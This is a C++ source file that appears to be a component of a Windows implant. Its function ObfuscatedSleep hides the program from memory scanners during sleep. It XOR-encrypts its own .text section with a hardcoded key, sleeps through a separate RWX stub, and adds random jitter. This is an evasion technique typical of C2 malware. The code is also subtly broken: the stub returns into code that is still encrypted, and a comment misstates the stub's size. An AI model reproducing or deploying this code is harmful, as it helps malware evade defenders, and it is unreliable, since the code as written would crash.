#include "SleepObfusc.h"
#include <cstdlib>
#include <ctime>

// ── Find .text section of the current module ─────────────────────────────────

static bool FindTextSection(PVOID* outBase, DWORD* outSize) {
    HMODULE hMe = GetModuleHandleA(NULL);
    auto* dos = (PIMAGE_DOS_HEADER)hMe;
    auto* nt  = (PIMAGE_NT_HEADERS)((BYTE*)hMe + dos->e_lfanew);
    auto* sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            *outBase = (BYTE*)hMe + sec->VirtualAddress;
            *outSize = sec->Misc.VirtualSize;
            return true;
        }
    }
    return false;
}

// ── Build a minimal Sleep(ms) stub in a fresh allocation ─────────────────────
// We need this because we're about to encrypt our own .text section —
// we can't execute from encrypted memory, so the sleep code lives here.
//
// x64 stub (17 bytes):
//   48 B9 xx xx xx xx xx xx xx xx   mov rcx, <ms>        ; 1st arg
//   48 B8 xx xx xx xx xx xx xx xx   mov rax, <Sleep ptr>  ; fn ptr
//   FF D0                            call rax
//   C3                               ret

static void* BuildSleepStub(DWORD ms) {
    BYTE stub[23] = {
        0x48, 0xB9, 0,0,0,0, 0,0,0,0,  // mov rcx, ms (64-bit zero-extended)
        0x48, 0xB8, 0,0,0,0, 0,0,0,0,  // mov rax, Sleep
        0xFF, 0xD0,                      // call rax
        0xC3                             // ret
    };

    DWORD64 msVal  = ms;
    DWORD64 fnAddr = (DWORD64)(void*)Sleep;
    memcpy(stub + 2,  &msVal,  8);
    memcpy(stub + 12, &fnAddr, 8);

    void* mem = VirtualAlloc(NULL, sizeof(stub),
                             MEM_COMMIT | MEM_RESERVE,
                             PAGE_EXECUTE_READWRITE);
    if (!mem) return NULL;
    memcpy(mem, stub, sizeof(stub));
    return mem;
}

// ── XOR the section in-place ──────────────────────────────────────────────────

static const BYTE XOR_KEY[] = {
    0xB4, 0xDB, 0x4B, 0x3A, 0xF0, 0x1E, 0xC2, 0x77,
    0x9D, 0x55, 0x6A, 0x83, 0x2F, 0xE1, 0x48, 0xCC
};

static void XorSection(PVOID base, DWORD size) {
    BYTE* p = (BYTE*)base;
    for (DWORD i = 0; i < size; i++)
        p[i] ^= XOR_KEY[i % sizeof(XOR_KEY)];
}

// ── ObfuscatedSleep ───────────────────────────────────────────────────────────

void SleepObfusc::ObfuscatedSleep(DWORD ms, DWORD ms_jitter) {
    if (ms_jitter > 0) {
        static bool seeded = false;
        if (!seeded) { srand((unsigned)time(NULL)); seeded = true; }
        ms += (DWORD)(rand() % (ms_jitter + 1));
    }

    PVOID textBase = NULL;
    DWORD textSize = 0;
    if (!FindTextSection(&textBase, &textSize)) {
        // Fallback: plain sleep if we can't find .text
        Sleep(ms);
        return;
    }

    // Build the sleep stub in a separate allocation before we encrypt ourselves
    void* stub = BuildSleepStub(ms);
    if (!stub) { Sleep(ms); return; }

    // Flip .text to RW, encrypt it
    DWORD oldProt = 0;
    if (!VirtualProtect(textBase, textSize, PAGE_READWRITE, &oldProt)) {
        VirtualFree(stub, 0, MEM_RELEASE);
        Sleep(ms);
        return;
    }
    XorSection(textBase, textSize);

    // Sleep via the stub (our .text is now encrypted garbage)
    ((void(*)())stub)();

    // Decrypt and restore permissions
    XorSection(textBase, textSize);
    VirtualProtect(textBase, textSize, PAGE_EXECUTE_READ, &oldProt);

    VirtualFree(stub, 0, MEM_RELEASE);
}
